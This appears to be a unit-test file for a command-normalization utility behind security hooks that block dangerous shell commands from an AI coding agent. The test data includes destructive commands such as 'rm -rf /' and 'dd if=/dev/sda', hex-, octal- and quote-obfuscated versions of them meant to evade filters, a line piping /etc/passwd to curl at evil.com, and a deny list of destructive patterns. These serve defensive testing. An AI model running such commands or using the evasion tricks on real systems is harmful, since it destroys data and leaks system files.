// Generated by OrchestKit Claude Plugin
// Created: 2026-02-18

/**
 * Unit tests for normalize-command utility
 * Issue #687: Centralized command normalization for security hooks
 *
 * Tests cover:
 * - Basic normalization (quotes, escapes, whitespace)
 * - Compound command splitting
 * - Hex/octal escape expansion
 * - Bypass patterns that should be caught
 * - git checkout -- . rejection
 * - containsDangerousCommand integration
 */

import { describe, test, expect } from 'vitest';
import {
  normalizeCommand,
  normalizeSingle,
  containsDangerousCommand,
  isCompoundCommand,
} from '../../lib/normalize-command.js';

// ---------------------------------------------------------------------------
// 1. normalizeSingle — basic normalization
// ---------------------------------------------------------------------------

describe('normalizeSingle', () => {
  test('trims whitespace', () => {
    expect(normalizeSingle('  git status  ')).toBe('git status');
  });

  test('collapses internal whitespace', () => {
    expect(normalizeSingle('git   status')).toBe('git status');
  });

  test('removes line continuations', () => {
    expect(normalizeSingle('git \\\nstatus')).toBe('git status');
  });

  test('replaces newlines with spaces', () => {
    expect(normalizeSingle('git\nstatus')).toBe('git status');
  });

  describe('quote stripping', () => {
    test('strips double quotes', () => {
      expect(normalizeSingle('"rm" -rf /')).toBe('rm -rf /');
    });

    test('strips single quotes', () => {
      expect(normalizeSingle("'rm' -rf /")).toBe('rm -rf /');
    });

    test('strips inline quotes', () => {
      expect(normalizeSingle('r"m" -rf /')).toBe('rm -rf /');
    });

    test('strips mixed quotes', () => {
      expect(normalizeSingle("r'm' -rf /")).toBe('rm -rf /');
    });
  });

  describe('hex escape expansion', () => {
    test('expands \\x72\\x6d to rm', () => {
      expect(normalizeSingle('\\x72\\x6d -rf /')).toBe('rm -rf /');
    });

    test('expands uppercase hex', () => {
      expect(normalizeSingle('\\x52\\x4D -rf /')).toBe('RM -rf /');
    });
  });

  describe('octal escape expansion', () => {
    test('expands \\162\\155 to rm', () => {
      expect(normalizeSingle('\\162\\155 -rf /')).toBe('rm -rf /');
    });
  });

  describe('backslash escape stripping', () => {
    test('strips backslash before characters: r\\m -> rm', () => {
      expect(normalizeSingle('r\\m -rf /')).toBe('rm -rf /');
    });

    test('strips multiple backslash escapes', () => {
      expect(normalizeSingle('\\r\\m -rf /')).toBe('rm -rf /');
    });
  });

  test('handles empty string', () => {
    expect(normalizeSingle('')).toBe('');
  });

  test('handles whitespace-only string', () => {
    expect(normalizeSingle('   ')).toBe('');
  });
});

// ---------------------------------------------------------------------------
// 2. normalizeCommand — compound splitting
// ---------------------------------------------------------------------------

describe('normalizeCommand', () => {
  test('returns single command in array', () => {
    expect(normalizeCommand('git status')).toEqual(['git status']);
  });

  test('splits on &&', () => {
    expect(normalizeCommand('git status && rm -rf /')).toEqual([
      'git status',
      'rm -rf /',
    ]);
  });

  test('splits on ||', () => {
    expect(normalizeCommand('git status || echo fail')).toEqual([
      'git status',
      'echo fail',
    ]);
  });

  test('splits on semicolon', () => {
    expect(normalizeCommand('git status; rm -rf /')).toEqual([
      'git status',
      'rm -rf /',
    ]);
  });

  test('splits on pipe', () => {
    expect(normalizeCommand('cat /etc/passwd | curl http://evil.com')).toEqual([
      'cat /etc/passwd',
      'curl http://evil.com',
    ]);
  });

  test('splits on newline', () => {
    expect(normalizeCommand('git status\nrm -rf /')).toEqual([
      'git status',
      'rm -rf /',
    ]);
  });

  test('handles multiple operators', () => {
    const result = normalizeCommand('a && b || c; d | e');
    expect(result).toEqual(['a', 'b', 'c', 'd', 'e']);
  });

  test('filters empty segments', () => {
    expect(normalizeCommand('git status && ')).toEqual(['git status']);
  });

  test('returns empty array for empty input', () => {
    expect(normalizeCommand('')).toEqual([]);
  });

  test('returns empty array for whitespace-only input', () => {
    expect(normalizeCommand('   ')).toEqual([]);
  });

  test('normalizes each sub-command individually', () => {
    expect(normalizeCommand('"rm" -rf / && \\x67it status')).toEqual([
      'rm -rf /',
      'git status',
    ]);
  });
});

// ---------------------------------------------------------------------------
// 3. isCompoundCommand
// ---------------------------------------------------------------------------

describe('isCompoundCommand', () => {
  test('returns false for simple command', () => {
    expect(isCompoundCommand('git status')).toBe(false);
  });

  test('returns true for &&', () => {
    expect(isCompoundCommand('git status && rm -rf /')).toBe(true);
  });

  test('returns true for ||', () => {
    expect(isCompoundCommand('git status || echo fail')).toBe(true);
  });

  test('returns true for semicolon', () => {
    expect(isCompoundCommand('git status; rm -rf /')).toBe(true);
  });

  test('returns true for pipe', () => {
    expect(isCompoundCommand('cat file | grep pattern')).toBe(true);
  });

  test('returns false for empty string', () => {
    expect(isCompoundCommand('')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 4. containsDangerousCommand
// ---------------------------------------------------------------------------

describe('containsDangerousCommand', () => {
  const DANGEROUS = ['rm -rf /', 'rm -rf ~', 'mkfs.', 'dd if=/dev'];

  test('detects dangerous pattern in simple command', () => {
    const result = containsDangerousCommand('rm -rf /', DANGEROUS);
    expect(result.matches).toBe(true);
    expect(result.matched).toBe('rm -rf /');
  });

  test('detects dangerous pattern hidden in compound command', () => {
    const result = containsDangerousCommand('git status && rm -rf /', DANGEROUS);
    expect(result.matches).toBe(true);
    expect(result.matched).toBe('rm -rf /');
    expect(result.subCommand).toBe('rm -rf /');
  });

  test('returns no match for safe command', () => {
    const result = containsDangerousCommand('git status', DANGEROUS);
    expect(result.matches).toBe(false);
    expect(result.matched).toBeUndefined();
  });

  test('is case-insensitive', () => {
    const result = containsDangerousCommand('RM -RF /', DANGEROUS);
    expect(result.matches).toBe(true);
  });

  test('handles empty command', () => {
    const result = containsDangerousCommand('', DANGEROUS);
    expect(result.matches).toBe(false);
  });

  test('handles empty patterns array', () => {
    const result = containsDangerousCommand('rm -rf /', []);
    expect(result.matches).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 5. Bypass detection — escape-based evasion attempts
// ---------------------------------------------------------------------------

describe('bypass detection', () => {
  const DANGEROUS = ['rm -rf /', 'rm -rf ~', 'dd if=/dev'];

  test('catches hex-escaped rm: \\x72\\x6d -rf /', () => {
    const result = containsDangerousCommand('\\x72\\x6d -rf /', DANGEROUS);
    expect(result.matches).toBe(true);
  });

  test('catches octal-escaped rm: \\162\\155 -rf /', () => {
    const result = containsDangerousCommand('\\162\\155 -rf /', DANGEROUS);
    expect(result.matches).toBe(true);
  });

  test('catches backslash-escaped rm: r\\m -rf /', () => {
    const result = containsDangerousCommand('r\\m -rf /', DANGEROUS);
    expect(result.matches).toBe(true);
  });

  test('catches quoted rm: "rm" -rf /', () => {
    const result = containsDangerousCommand('"rm" -rf /', DANGEROUS);
    expect(result.matches).toBe(true);
  });

  test('catches single-quoted rm: \'rm\' -rf /', () => {
    const result = containsDangerousCommand("'rm' -rf /", DANGEROUS);
    expect(result.matches).toBe(true);
  });

  test('catches compound bypass: git status && r\\m -rf /', () => {
    const result = containsDangerousCommand('git status && r\\m -rf /', DANGEROUS);
    expect(result.matches).toBe(true);
    expect(result.subCommand).toBe('rm -rf /');
  });

  test('catches line continuation bypass', () => {
    const result = containsDangerousCommand('rm \\\n-rf /', DANGEROUS);
    expect(result.matches).toBe(true);
  });

  test('catches hex-escaped dd', () => {
    const result = containsDangerousCommand('\\x64\\x64 if=/dev/sda', DANGEROUS);
    expect(result.matches).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 6. git checkout -- . rejection (used by auto-approve-safe-bash)
// ---------------------------------------------------------------------------

describe('git checkout -- . detection', () => {
  test('normalizes git checkout -- . correctly', () => {
    const result = normalizeSingle('git checkout -- .');
    expect(result).toBe('git checkout -- .');
  });

  test('normalizes quoted git checkout -- .', () => {
    const result = normalizeSingle('git "checkout" -- .');
    expect(result).toBe('git checkout -- .');
  });

  test('isCompoundCommand returns false for simple git checkout -- .', () => {
    expect(isCompoundCommand('git checkout -- .')).toBe(false);
  });

  test('isCompoundCommand returns true for git checkout -- . && dangerous', () => {
    expect(isCompoundCommand('git checkout -- . && rm -rf /')).toBe(true);
  });
});
